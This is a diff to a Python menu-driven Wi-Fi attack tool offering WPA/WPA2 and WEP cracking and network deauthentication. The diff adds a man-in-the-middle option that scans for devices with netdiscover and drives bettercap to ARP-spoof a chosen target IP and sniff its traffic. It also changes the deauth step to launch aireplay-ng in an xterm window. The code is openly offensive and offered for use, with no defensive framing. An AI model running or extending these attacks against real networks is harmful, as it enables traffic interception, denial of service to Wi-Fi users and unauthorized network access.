@@ -18,8 +18,8 @@ LIGHT_CYAN = "\033[1;36m"
 LIGHT_WHITE = "\033[1;37m"
 
 os.system("cls||clear")
-print(f"""
 
+print(f"""
 {YELLOW}                     .   {YELLOW}
 {YELLOW}                    / V\ {YELLOW}       _    _  _____ _     ______      _____ ______  ___  _____  _   __
 {YELLOW}                  / `  / {YELLOW}      | |  | ||  _  | |    |  ___|    /  __ \| ___ \/ _ \/  __ \| | / /
@@ -42,6 +42,7 @@ def select_attack():
     print(f"{YELLOW}   [{RED}0{YELLOW}] {LIGHT_WHITE}WPA / WPA2 Attack {YELLOW}{LIGHT_WHITE} ")
     print(f"{YELLOW}   [{RED}1{YELLOW}] {LIGHT_WHITE}WEP Attack {YELLOW}{LIGHT_WHITE} ")
     print(f"{YELLOW}   [{RED}2{YELLOW}] {LIGHT_WHITE}Network Deauth {YELLOW}{LIGHT_WHITE} ")
+    print(f"{YELLOW}   [{RED}3{YELLOW}] {LIGHT_WHITE}MITM Attack (man in the meddle) {YELLOW}{LIGHT_WHITE} ")
     print("")
     select = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Select once{YELLOW} :{LIGHT_WHITE} ")
     print("")
@@ -51,6 +52,8 @@ def select_attack():
         WEP_hack()
     elif select == "2":
         net_deauth_attack()
+    elif select == "3":
+        MITM_attack()
     else:
         print(f"{YELLOW}   [{RED}*{YELLOW}] {LIGHT_WHITE}The value you entered does not exist {YELLOW}...{LIGHT_WHITE}\n")
 
@@ -84,9 +87,9 @@ def WPA_WPA2_hack():
             exit()
 
     def monitor_mode_on(interface):
-        subprocess.run(f"airmon-ng start {interface}", shell=True)
+        subprocess.run(f"airmon-ng start {interface}", shell=True, stdout=subprocess.DEVNULL)
         time.sleep(2)
-        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode activated {YELLOW}✅ \n")
+        print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode activated {YELLOW}✅ \n",)
         time.sleep(3)
 
     def show_wifi_list(mon_interface):
@@ -124,7 +127,7 @@ def WPA_WPA2_hack():
         time.sleep(2)
 
     def monitor_mode_off(mon_interface):
-        subprocess.run(f"airmon-ng stop {mon_interface}", shell=True)
+        subprocess.run(f"airmon-ng stop {mon_interface}", shell=True, stdout=subprocess.DEVNULL)
         time.sleep(8)
         print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode has been stopped {YELLOW}✅")
         time.sleep(2)
@@ -180,7 +183,7 @@ def WEP_hack():
             exit()
     
     def monitor_mode_on(interface):
-        subprocess.run(f"airmon-ng start {interface}", shell=True)
+        subprocess.run(f"airmon-ng start {interface}", shell=True, stdout=subprocess.DEVNULL)
         time.sleep(2)
         print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode activated {YELLOW}✅\n")
         time.sleep(4)
@@ -212,7 +215,7 @@ def WEP_hack():
         time.sleep(3)
 
     def monitor_mode_off(mon_interface):
-        subprocess.run(f"airmon-ng stop {mon_interface}", shell=True)
+        subprocess.run(f"airmon-ng stop {mon_interface}", shell=True, stdout=subprocess.DEVNULL)
         time.sleep(8)
         print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode has been stopped {YELLOW}✅")
         time.sleep(3)
@@ -268,7 +271,7 @@ def net_deauth_attack():
     
     def start_monitor_mode(interface):
         print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Turn on monitor mode {YELLOW}...\n {LIGHT_WHITE}")
-        subprocess.run(f"airmon-ng start {interface}", shell=True)
+        subprocess.run(f"airmon-ng start {interface}", shell=True, stdout=subprocess.DEVNULL)
         time.sleep(2)
         print(f"\n{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode activated {YELLOW}✅\n")
         time.sleep(4)
@@ -284,11 +287,12 @@ def net_deauth_attack():
         time.sleep(2)
 
     def start_deauth_attack(deauth_num, net_bssid, mon_interface):
-        print("{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Start deauth attack {YELLOW}...")
-        attack = subprocess.run(["aireplay-ng", "--deauth", deauth_num, "-a", net_bssid, mon_interface])
+        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Start deauth attack {YELLOW}...")
+        time.sleep(2)
+        attack = subprocess.run(["xterm", "-hold", "-e", f"sudo aireplay-ng --deauth {deauth_num} -a {net_bssid} {mon_interface}"])
     
     def monitor_mode_off(mon_interface):
-        subprocess.run(f"airmon-ng stop {mon_interface}", shell=True)
+        subprocess.run(f"airmon-ng stop {mon_interface}", shell=True, stdout=subprocess.DEVNULL)
         time.sleep(8)
         print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Monitor Mode has been stopped {YELLOW}✅")
         time.sleep(3)
@@ -309,6 +313,82 @@ def net_deauth_attack():
         monitor_mode_off(mon_interface)
 
     start_hack()
+
+def MITM_attack():
+    def get_network_interfaces():
+        result = subprocess.run("iwconfig 2>/dev/null", shell=True, text=True, capture_output=True)
+        interfaces = []
+        for line in result.stdout.splitlines():
+            if "IEEE 802.11" in line:
+                iface = line.split()[0]
+                interfaces.append(iface)
+        return interfaces
+
+    def choose_interface():
+        interfaces = get_network_interfaces()
+        if not interfaces:
+            print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}No network cards found {YELLOW}...\n")
+            exit()
+
+        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}ًWIFI Interface{YELLOW} :{LIGHT_WHITE} ")
+        for i, iface in enumerate(interfaces):
+            print("")
+            print(f"   {YELLOW}[{RED}{i}{YELLOW}] {LIGHT_WHITE}{iface}")
+            print("")
+
+        choice = input(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Choice WI-FI Interface{YELLOW} :{LIGHT_WHITE} ")
+        try:
+            return interfaces[int(choice)]
+        except (ValueError, IndexError):
+            print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Invalid choice. {YELLOW}❌")
+            exit()
+
+    def show_device(interface):
+        print(f"{YELLOW}[{RED}*{YELLOW}] {LIGHT_WHITE}Network connected devices {YELLOW}: {LIGHT_GRAY}")
+        time.sleep(2)
+        proc = subprocess.Popen(["netdiscover", "-i", interface])
+        time.sleep(20)
+        proc.send_signal(signal.SIGINT)
+        proc.wait()
+
+    def run_bettercap(interface="eth0", target_ip=None):
+        print(f"\n{YELLOW}[{RED}🔍{YELLOW}] {LIGHT_WHITE}Start Bettercap on terminal {YELLOW}.\n")
+        commands = f"""
+net.probe on
+set arp.spoof.targets {target_ip}
+arp.spoof on
+net.sniff on
+        """
+
+        try:
+
+            process = subprocess.Popen(
+                ["sudo", "bettercap", "-iface", interface],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1
+            )
+
+            process.stdin.write(commands)
+            process.stdin.flush()
+
+            print(f"{YELLOW}[{RED}📡{YELLOW}] {LIGHT_WHITE}Showing results {YELLOW}.\n")
+            for line in process.stdout:
+                print(line.strip())
+
+        except KeyboardInterrupt:
+            print(f"\n{YELLOW}[{RED} ⛔{YELLOW}] {LIGHT_WHITE}Exit {YELLOW}.\n")
+        except Exception as e:
+            print(f"\n ❌ Errr: {e}")
+
+    if __name__ == "__main__":
+        interface = choose_interface()
+        show_device(interface)
+        target_ip = input(f"\n{YELLOW}[{RED}🎯{YELLOW}] {LIGHT_WHITE}Enter targer IP address {YELLOW}:{LIGHT_WHITE} ")
+        run_bettercap(interface, target_ip)
+
 
 
 select_attack()
